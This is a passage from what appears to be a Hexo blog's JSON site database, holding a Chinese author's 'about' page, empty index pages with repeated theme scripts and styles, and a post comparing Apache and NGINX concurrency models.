\"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"","more":"<h3 id=\"我\"><a href=\"#我\" class=\"headerlink\" title=\"我\"></a>我</h3><p>我只是这茫茫人海的80亿分之一，真的不太重要。</p>\n<h3 id=\"从0到1建站\"><a href=\"#从0到1建站\" class=\"headerlink\" title=\"从0到1建站\"></a>从0到1建站</h3><p>这次建站真的是从0到1建的这个站，之前 Github 上的站，是直接fork的别人的站，因为 Github 上的站多多少少都会适配 Github ，比如直接采用 Github 的头像进行网站某个部分的一部分。</p>\n<p>在国内 Gitee 上又与 Github 有很大的不同，gitee采用pages搭建站，只能给仓库取名字为个人空间的名字，而在 Github 上取名字是“个人空间的名字+ github.io”，这个最大的区别就在于在gitee上是没有办法通过搜索来得到别人的搭建好的pages仓库，而在 Github 上可以通过搜索“github.io”进行查找，来找到别人搭建的站点。</p>\n<p>从下载node.js，安装HEXO开始，一步一步开始搭建自己的这个网站，历时到我开始写这个about文件已经有3天了。期间走过的弯路确实不少，之后我会专门做一个分类，来把我搭建博客的过程和遇到的问题来进行汇总，帮助后来者少走弯路。</p>\n<h3 id=\"为什么做这个站\"><a href=\"#为什么做这个站\" class=\"headerlink\" title=\"为什么做这个站\"></a>为什么做这个站</h3><ul>\n<li><p>为了在这个互联网世界里给自己拓展出一个清静之地吧。</p>\n</li>\n<li><p>之前在 Github 上其实已经有一个站了，也正因为<a href=\"http://liuxpblog.eu.org/\"><strong>之前那个站</strong></a>搭建在 Github 上的原因，国内访问起来速度也是一流的感人。所以就打算在 Gitee 上再搭建一个站。</p>\n</li>\n</ul>\n<h3 id=\"这个站用来干什么\"><a href=\"#这个站用来干什么\" class=\"headerlink\" title=\"这个站用来干什么\"></a>这个站用来干什么</h3><p>我初中时还很热爱QQ空间，经常发表动态；到高中开始用微信，偶尔还会发几条朋友圈，后来大一，再到之后在部队待的日子里，使我完全不再想向别人展示自己的生活了。到现在我QQ空间最后一条停留在了21年，发表的朋友圈也仅仅不到20条。真的是被这个嘈杂的互联网世界影响到了，直到后来我慢慢接触到了个人博客，我真的是被这个小玩意吸引到了。我很喜欢这种倾诉心声的感觉，在这里我就是老大。是只属于我一个人的地方。</p>\n<p>在这个站里面，我会记录自己在学习上学到的好玩的技能，记录在网络上学到某些技能，归纳汇总，呈现出来，最后还会偶尔拿来记录一下生活中的日常。</p>\n<h3 id=\"联系我\"><a href=\"#联系我\" class=\"headerlink\" title=\"联系我\"></a>联系我</h3><p>QQ邮箱：<code>liuxp731@qq.com</code><br>Google邮箱：<code>liuxiaopeng731@gmail.com</code></p>\n"},{"title":"CATEGORIES","date":"2020-03-20T02:32:05.000Z","type":"categories","_content":"","source":"categories/index.md","raw":"---\ntitle: CATEGORIES\ndate: 2020-03-20 10:32:05\ntype: \"categories\"\n---","updated":"2024-05-03T03:55:54.889Z","path":"categories/index.html","comments":1,"layout":"page","_id":"clvq6s5cm00027zj3cejo8oof","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"","more":""},{"title":"archives","date":"2023-04-16T02:41:03.000Z","type":"archives","_content":"","source":"archives/index.md","raw":"---\ntitle: archives\ndate: 2023-04-16 10:41:03\ntype: \"archives\"\n---\n","updated":"2024-05-03T03:55:54.889Z","path":"archives/index.html","comments":1,"layout":"page","_id":"clvq6s5cs00067zj385rr53dj","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"","more":""},{"title":"TAGS","date":"2023-04-16T02:33:57.000Z","type":"tags","_content":"","source":"tags/index.md","raw":"---\ntitle: TAGS\ndate: 2023-04-16 10:33:57\ntype: \"tags\"\n---\n","updated":"2024-05-03T03:55:54.889Z","path":"tags/index.html","comments":1,"layout":"page","_id":"clvq6s5cu00087zj3hgz5fq72","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"","more":""}],"Post":[{"title":"Apache 与 NGINX 对比","date":"2023-10-06T07:31:24.000Z","_content":"\n### Apache 与 NGINX 各有什么优缺点\n\nApache 同步阻塞式的工作方式，NGINX 异步非阻塞式的工作方式。\n\n<!-- more -->\n\n* Apache 的优点\n\n1. Apache的rewrite功能比nginx的要强大\n2. 找到模块模块非常多，基本想要的功能都能对较少存在时间较长，文献较全，bug也少\n3. 动静态解析都超稳定\n\n* Apache 的缺点\n\n1. 由于工作模式是同步阻塞型，导致资源消耗较高，并发能力较差\n\n* NGINX 的优点\n\n1. 轻量级服务，比Apache占用更少的内存及资源并发能力强，nginx 处理请求是异步非阻塞的，而apache 则是阻塞型的，在高并发下nginx能保持低资源低消耗高性能\n2. 高度模块化的设计，编写模块相对简单\n3. 社区活跃，各种高性能模块产出迅速\n\n* NGINX 的缺点:\n\n1. 动态处理上需要使用fastcgi连接PHP的FPM服务，相比Apache不占优势\n\n总结：\n\nNginx 适合做静态处理，简单，效率高Apache 适合做动态处理，稳定，功能强并发较高的情况下优先选择Nginx，并发要求不高的情况下两者都可以，规模稍大的可以使用Nginx作为反向代理，然后将动态请求负载均衡到后端Apache上。\n\n### 什么是同步与异步\n\n同步:小明收到快递将送达的短信，在楼下一直等到快递送达。\n\n异步:小明收到快递将送达的短信，小明不会下楼去取， 而是快递小哥到楼下后，打电话通知小明，然后小明下楼取快递\n\n### 什么是阻塞与非阻塞\n\n阻塞:小明收到快递即将送达的信息后，什么事都不做，一直专门等快递。\n非阻塞:小明收到快递即将送达的等快递的时候，还一边敲代码信息后，一边听歌，等着快递送达的消息。\n\n### Nginx以异步非阻塞方式工作\n\n客户端发送request，服务器分配work进程来处理能立即处理完的，处理后work进程释放资源，进行下一个request的处理。   \n不能立即处理完的work进程注册返回事件，然后接着去处理其他request。   \n当之前的request结果返回后，触发返回事件，由空闲work进程接着处理通过这种快速处理，快速释放请求的方式，达到同样的配置可以处理更大并发量的目的。","source":"_posts/Apache-NGINX.md","raw":"---\ntitle: Apache 与 NGINX 对比\ndate: 2023-10-06 15:31:24\ncategories: 理论知识\ntags:\n  - 面试\n  - Linux\n---\n\n### Apache 与 NGINX 各有什么优缺点\n\nApache 同步阻塞式的工作方式，NGINX 异步非阻塞式的工作方式。\n\n<!-- more -->\n\n* Apache 的优点\n\n1. Apache的rewrite功能比nginx的要强大\n2. 找到模块模块非常多，基本想要的功能都能对较少存在时间较长，文献较全，bug也少\n3. 动静态解析都超稳定\n\n* Apache 的缺点\n\n1. 由于工作模式是同步阻塞型，导致资源消耗较高，并发能力较差\n\n* NGINX 的优点\n\n1. 轻量级服务，比Apache占用更少的内存及资源并发能力强，nginx 处理请求是异步非阻塞的，而apache 则是阻塞型的，在高并发下nginx能保持低资源低消耗高性能\n2. 高度模块化的设计，编写模块相对简单\n3. 社区活跃，各种高性能模块产出迅速\n\n* NGINX 的缺点:\n\n1. 动态处理上需要使用fastcgi连接PHP的FPM服务，相比Apache不占优势\n\n总结：\n\nNginx 适合做静态处理，简单，效率高Apache 适合做动态处理，稳定，功能强并发较高的情况下优先选择Nginx，并发要求不高的情况下两者都可以，规模稍大的可以使用Nginx作为反向代理，然后将动态请求负载均衡到后端Apache上。\n\n### 什么是同步与异步\n\n同步:小明收到快递将送达的短信，在楼下一直等到快递送达。\n\n异步:小明收到快递将送达的短信，小明不会下楼去取， 而是快递小哥到楼下后，打电话通知小明，然后小明下楼取快递\n\n### 什么是阻塞与非阻塞\n\n阻塞:小明收到快递即将送达的信息后，什么事都不做，一直专门等快递。\n非阻塞:小明收到快递即将送达的等快递的时候，还一边敲代码信息后，一边听歌，等着快递送达的消息。\n\n### Nginx以异步非阻塞方式工作\n\n客户端发送request，服务器分配work进程来处理能立即处理完的，处理后work进程释放资源，进行下一个request的处理。   \n不能立即处理完的work进程注册返回事件，然后接着去处理其他request。   \n当之前的request结果返回后，触发返回事件，由空闲work进程接着处理通过这种快速处理，快速释放请求的方式，达到同样的配置可以处理更大并发量的目的。","slug":"Apache-NGINX","published":1,"updated":"2024-05-03T03:55:54.713Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5cj00017zj3cwkphvbg","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><h3 id=\"Apache-与-NGINX-各有什么优缺点\"><a href=\"#Apache-与-NGINX-各有什么优缺点\" class=\"headerlink\" title=\"Apache 与 NGINX 各有什么优缺点\"></a>Apache 与 NGINX 各有什么优缺点</h3><p>Apache 同步阻塞式的工作方式，NGINX 异步非阻塞式的工作方式。</p>\n<span id=\"more\"></span>\n\n<ul>\n<li>Apache 的优点</li>\n</ul>\n<ol>\n<li>Apache的rewrite功能比nginx的要强大</li>\n<li>找到模块模块非常多，基本想要的功能都能对较少存在时间较长，文献较全，bug也少</li>\n<li>动静态解析都超稳定</li>\n</ol>\n<ul>\n<li>Apache 的缺点</li>\n</ul>\n<ol>\n<li>由于工作模式是同步阻塞型，导致资源消耗较高，并发能力较差</li>\n</ol>\n<ul>\n<li>NGINX 的优点</li>\n</ul>\n<ol>\n<li>轻量级服务，比Apache占用更少的内存及资源并发能力强，nginx 处理请求是异步非阻塞的，而apache 则是阻塞型的，在高并发下nginx能保持低资源低消耗高性能</li>\n<li>高度模块化的设计，编写模块相对简单</li>\n<li>社区活跃，各种高性能模块产出迅速</li>\n</ol>\n<ul>\n<li>NGINX 的缺点:</li>\n</ul>\n<ol>\n<li>动态处理上需要使用fastcgi连接PHP的FPM服务，相比Apache不占优势</li>\n</ol>\n<p>总结：</p>\n<p>Nginx 适合做静态处理，简单，效率高Apache 适合做动态处理，稳定，功能强并发较高的情况下优先选择Nginx，并发要求不高的情况下两者都可以，规模稍大的可以使用Nginx作为反向代理，然后将动态请求负载均衡到后端Apache上。</p>\n<h3 id=\"什么是同步与异步\"><a href=\"#什么是同步与异步\" class=\"headerlink\" title=\"什么是同步与异步\"></a>什么是同步与异步</h3><p>同步:小明收到快递将送达的短信，在楼下一直等到快递送达。</p>\n<p>异步:小明收到快递将送达的短信，小明不会下楼去取， 而是快递小哥到楼下后，打电话通知小明，然后小明下楼取快递</p>\n<h3 id=\"什么是阻塞与非阻塞\"><a href=\"#什么是阻塞与非阻塞\" class=\"headerlink\" title=\"什么是阻塞与非阻塞\"></a>什么是阻塞与非阻塞</h3><p>阻塞:小明收到快递即将送达的信息后，什么事都不做，一直专门等快递。<br>非阻塞:小明收到快递即将送达的等快递的时候，还一边敲代码信息后，一边听歌，等着快递送达的消息。</p>\n<h3 id=\"Nginx以异步非阻塞方式工作\"><a href=\"#Nginx以异步非阻塞方式工作\" class=\"headerlink\" title=\"Nginx以异步非阻塞方式工作\"></a>Nginx以异步非阻塞方式工作</h3><p>客户端发送request，服务器分配work进程来处理能立即处理完的，处理后work进程释放资源，进行下一个request的处理。<br>不能立即处理完的work进程注册返回事件，然后接着去处理其他request。<br>当之前的request结果返回后，触发返回事件，由空闲work进程接着处理通过这种快速处理，快速释放请求的方式，达到同样的配置可以处理更大并发量的目的。</p>\n","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"Apache-与-NGINX-各有什么优缺点\"><a href=\"#Apache-与-NGINX-各有什么优缺点\" class=\"headerlink\" title=\"Apache 与 NGINX 各有什么优缺点\"></a>Apache 与 NGINX 各有什么优缺点</h3><p>Apache 同步阻塞式的工作方式，NGINX 异步非阻塞式的工作方式。</p>","more":"<ul>\n<li>Apache 的优点</li>\n</ul>\n<ol>\n<li>Apache的rewrite功能比nginx的要强大</li>\n<li>找到模块模块非常多，基本想要的功能都能对较少存在时间较长，文献较全，bug也少</li>\n<li>动静态解析都超稳定</li>\n</ol>\n<ul>\n<li>Apache 的缺点</li>\n</ul>\n<ol>\n<li>由于工作模式是同步阻塞型，导致资源消耗较高，并发能力较差</li>\n</ol>\n<ul>\n<li>NGINX 的优点</li>\n</ul>\n<ol>\n<li>轻量级服务，比Apache占用更少的内存及资源并发能力强，nginx 处理请求是异步非阻塞的，而apache 则是阻塞型的，在高并发下nginx能保持低资源低消耗高性能</li>\n<li>高度模块化的设计，编写模块相对简单</li>\n<li>社区活跃，各种高性能模块产出迅速</li>\n</ol>\n<ul>\n<li>NGINX 的缺点:</li>\n</ul>\n<ol>\n<li>动态处理上需要使用fastcgi连接PHP的FPM服务，相比Apache不占优势</li>\n</ol>\n<p>总结：</p>\n<p>Nginx 适合做静态处理，简单，效率高Apache 适合做动态处理，稳定，功能强并发较高的情况下优先选择Nginx，并发要求不高的情况下两者都可以，规模稍大的可以使用Nginx作为反向代理，然后将动态请求负载均衡到后端Apache上。</p>\n<h3 id=\"什么是同步与异步\"><a href=\"#什么是同步与异步\" class=\"headerlink\" title=\"什么是同步与异步\"></a>什么是同步与异步</h3><p>同步:小明收到快递将送达的短信，在楼下一直等到快递送达。</p>\n<p>异步:小明收到快递将送达的短信，小明不会下楼去取， 而是快递小哥到楼下后，打电话通知小明，然后小明下楼取快递</p>\n<h3 id=\"什么是阻塞与非阻塞\"><a href=\"#什么是阻塞与非阻塞\" class=\"headerlink\" title=\"什么是阻塞与非阻塞\"></a>什么是阻塞与非阻塞</h3><p>阻塞:小明收到快递即将送达的信息后，什么事都不做，一直专门等快递。<br>非阻塞:小明收到快递即将送达的等快递的时候，还一边敲代码信息后，一边听歌，等着快递送达的消息。</p>\n<h3 id=\"Nginx以异步非阻塞方式工作\"><a href=\"#Nginx以异步非阻塞方式工作\" class=\"headerlink\" title=\"Nginx以异步非阻塞方式工作\"></a>Nginx以异步非阻塞方式工作</h3><p>客户端发送request，服务器分配work进程来处理能立即处理完的，处理后work进程释放资源，进行下一个request的处理。<br>不能立即处理完的work进程注册返回事件，然后接着去处理其他request。<br>当之前的request结果返回后，触发返回事件，由空闲work进程接着处理通过这种快速处理，快速释放请求的方式，达到同样的配置可以处理更大并发量的目的。</p>"},{"title":"Apache 优化着手点","date":"2023-10-06T06:09:32.000Z","_content":"\n* 利用Apache自带的 